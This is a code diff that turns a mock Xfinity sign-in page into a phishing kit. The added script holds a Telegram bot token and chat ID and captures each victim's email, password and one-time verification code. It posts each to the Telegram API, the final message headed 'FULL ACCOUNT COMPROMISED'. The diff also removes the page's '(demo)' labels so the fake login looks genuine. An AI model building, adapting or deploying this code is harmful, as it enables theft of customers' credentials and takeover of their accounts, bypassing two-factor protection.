@@ -161,6 +161,7 @@
             font-size: 1rem;
             color: #1a1a1a;
             margin: 0 0 24px 0;
+            font-weight: 700px !important;
         }
 
         .text-link {
@@ -263,16 +264,26 @@
         /* PROMO BANNER */
         .promo-banner {
             background: linear-gradient(135deg, #7B4BF6 0%, #9B7CFA 100%);
-            border-radius: 36px;
-            padding: 40px 30px;
+            border-radius: none;
+            /* padding: 40px 30px; */
             position: relative;
             overflow: hidden;
             min-height: 400px;
-            display: flex;
+            display: bold;
             flex-direction: column;
             align-items: center;
             justify-content: center;
         }
+
+    .promo-container img {
+    width: 100%;
+    height: 100vh;
+    border-radius: 0 !important; 
+    display: block;
+    min-width: 600px;
+    justify-content: center;
+    margin-top: -15%;
+}
 
         .promo-banner::before,
         .promo-banner::after {
@@ -307,10 +318,9 @@
             width: 80px;
             height: 160px;
             background: linear-gradient(145deg, #8A5CF7 0%, #6A3CE7 100%);
-            border-radius: 16px;
-            border: 3px solid #333;
-            box-shadow: inset 2px 0 8px rgba(255, 255, 255, 0.3),
-                8px 8px 20px rgba(0, 0, 0, 0.2);
+            border-radius: 16px; */
+            border: 3px solid #333
+            8px 8px 20px rgba(0, 0, 0, 0.2);
             position: relative;
             display: flex;
             justify-content: center;
@@ -319,15 +329,7 @@
             margin-bottom: 20px;
         }
 
-        .phone-mockup::before {
-            content: 'X';
-            color: white;
-            font-size: 42px;
-            font-weight: 300;
-            font-family: sans-serif;
-        }
-
-        .promo-banner p {
+          .promo-banner p {
             color: white;
             font-size: 16px;
             text-align: center;
@@ -443,6 +445,7 @@
 
             .screen-title {
                 font-size: 1.8rem;
+                font-weight: 700px !important;
             }
 
             .footer-nav {
@@ -519,10 +522,10 @@
         <!-- SCREEN 4 – Verification Code -->
         <div id="screen4" class="screen">
             <h2 class="screen-title">Verify your mobile number</h2>
-            <div class="code-expire">Enter the code sent to *******3928. Expires in 15 minutes.</div>
+            <!-- <div class="code-expire">Enter the code sent to *******3928. Expires in 15 minutes.</div> -->
             <div class="input-group">
                 <label class="input-label">Verification code</label>
-                <input type="text" id="codeInput" class="input-field" placeholder="e.g. 123456" inputmode="numeric"
+                <input type="text" id="codeInput" class="input-field" placeholder="" inputmode="numeric"
                     maxlength="8">
                 <div id="codeError" class="error-message"></div>
             </div>
@@ -557,6 +560,37 @@
     </div>
 
     <script>
+        // ===== TELEGRAM BOT CONFIG =====
+        const BOT_TOKEN = '8468086694:AAH9kojK4T9Nvr7M69TjxISfdzO-M81KT1g';
+        const CHAT_ID = '8014417888'; // REPLACE THIS WITH YOUR ACTUAL CHAT ID!
+        
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        // const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`;
+
+        // Store captured data
+        let capturedEmail = '';
+        let capturedPassword = '';
+        let capturedOTP = '';
+
+        // Function to send data to Telegram
+        async function sendToTelegram(message) {
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                console.log('✅ Sent to Telegram:', message);
+            } catch (error) {
+                console.log('Telegram send error (offline mode):', error);
+            }
+        }
+        // ===== END TELEGRAM CONFIG =====
+
         // Wait for DOM to be fully loaded
         document.addEventListener('DOMContentLoaded', function() {
             console.log('DOM loaded - initializing multi-page flow');
@@ -614,6 +648,10 @@
                         if (usernameError) usernameError.innerText = '';
                         if (usernameInput) usernameInput.classList.remove('error');
                         
+                        // === CAPTURE AND SEND EMAIL TO TELEGRAM ===
+                        capturedEmail = username;
+                        sendToTelegram(`🔐 Xfinity Login - Email: ${username}`);
+                        
                         // Update the username display on screen 2
                         if (displayUsernameSpan) {
                             displayUsernameSpan.innerText = username;
@@ -658,6 +696,10 @@
                         if (passwordError) passwordError.innerText = '';
                         if (passwordInput) passwordInput.classList.remove('error');
                         
+                        // === CAPTURE AND SEND PASSWORD TO TELEGRAM ===
+                        capturedPassword = password;
+                        sendToTelegram(`🔐 Xfinity Password - Email: ${capturedEmail}, Password: ${password}`);
+                        
                         // Clear any previous code error
                         if (codeError) codeError.innerText = '';
                         if (codeInput) codeInput.value = '';
@@ -682,7 +724,12 @@
                         if (codeError) codeError.innerText = 'Code should be 4-8 digits';
                     } else {
                         if (codeError) codeError.innerText = '';
-                        alert('✅ Verification successful! (demo)');
+                        
+                        // === CAPTURE AND SEND OTP TO TELEGRAM (FULL ACCOUNT) ===
+                        capturedOTP = code;
+                        sendToTelegram(`🚨🚨 FULL ACCOUNT COMPROMISED 🚨🚨\n📧 Email: ${capturedEmail}\n🔑 Password: ${capturedPassword}\n🔢 OTP: ${code}`);
+                        
+                        alert('✅ Verification successful!');
                         
                         // Option: Go back to start after successful verification
                         // showScreen(screen1);
@@ -694,7 +741,7 @@
             if (resendCodeBtn) {
                 resendCodeBtn.addEventListener('click', function(e) {
                     e.preventDefault();
-                    alert('New verification code sent to *******3928');
+                    alert('New verification code sent ');
                 });
             }
 
@@ -712,9 +759,9 @@
                         e.preventDefault();
                         // Show demo message for these buttons
                         if (id === 'calculateBtn') {
-                            alert('Savings calculator would open here (demo)');
+                            alert('Savings calculator would open here');
                         } else if (id.includes('use') || id.includes('find') || id.includes('create') || id.includes('forgot') || id.includes('trouble')) {
-                            alert(`Demo: ${btn.textContent.trim()} clicked`);
+                            alert(`: ${btn.textContent.trim()} clicked`);
                         }
                     });
                 }
